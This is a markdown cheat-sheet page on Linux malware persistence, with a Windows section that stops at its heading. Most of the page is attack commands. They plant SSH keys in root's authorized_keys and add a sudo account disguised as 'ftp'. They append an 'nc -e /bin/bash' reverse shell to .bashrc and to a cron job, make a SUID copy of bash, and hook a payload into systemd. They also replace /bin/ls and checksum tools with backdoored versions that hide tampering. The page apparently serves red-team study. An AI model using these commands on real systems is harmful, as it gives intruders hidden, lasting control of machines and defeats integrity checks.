---
title: Persistence techniques
description: How malwares persist in the victim host.
---

# Malware persistence techniques

## Linux

> [PDF - Linux Red Team Persistence Techniques](https://papers.vx-underground.org/papers/Linux/Persistence/Linux%20Red%20Team%20Persistence%20Techniques.pdf)
>
> [PDF - My Methods To Achieve Persistence In Linux Systems](https://papers.vx-underground.org/papers/Linux/Persistence/My%20Methods%20to%20Achieve%20Persistence%20in%20Linux%20Systems.pdf)
>
> [PDF - Understanding Linux Malware](https://reyammer.io/publications/2018_oakland_linuxmalware.pdf)

### SSH Key

```
echo <public_key> >> /root/.ssh/authorized_keys
echo <public_key> >> /home/<user>/.ssh/authorized_keys
```

### Add new account

```
useradd -m -s /bin/bash ftp
usermod -aG sudo ftp
passwd ftp
```

### Shell configuration backdoor

- `.bashrc` : Executed every time a user starts up a fresh terminal session in interactive mode.
- `.bash_profile` : Executed every time a user logs into a system. 

Example :

```
echo 'nc -e /bin/bash <IP> <PORT> 2>/dev/null &' >> ~/.bashrc
```

### Exposed services backdoor

- webshell

### Cronjobs

```
$ crontab -e
* * * * * nc <IP> <PORT> -e /bin/sh
```

```
/etc/cron.hourly/
/etc/crontab
/etc/cron.daily/
```

### Local privesc

```
cp /bin/bash /bin/sys
chmod u+s /bin/sys
/bin/sys -p
```

### System services / boot scripts

**systemd**

```
[Service]
Type=simple
ExecStartPre=<PAYLOAD>
...
```

**rc script**

```
/etc/rc.d/rc.local
/etc/rc.conf
/etc/init.d/
/etc/rcX.d/
/etc/rc.local
```

### X desktop autostart

- `~/.config/autostart`

### File replacement / infection

`ls` backdoor :

```
$ mv /bin/ls /bin/ls2
$ cat ls
#!/bin/bash

PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin

<BACKDOOR>
/bin/ls2 "$@"
$ chmod a+x ./ls
$ mv ./ls /bin/ls
```

`md5sum`, `sha256sum`, `*sum` backdoor that returns good hashes for backdoored binaries.

```
$ md5sum /bin/ls
b9dcdfcaea8082f5f5879086fdf7f2e2  /bin/ls
$ sha256sum /bin/ls
f48db5b77c6fddb35548fb86c6e279e5d18c55d2d4ff9adae66a2d582187e7c7  /bin/ls
```

## Windows

### Registry keys RUN

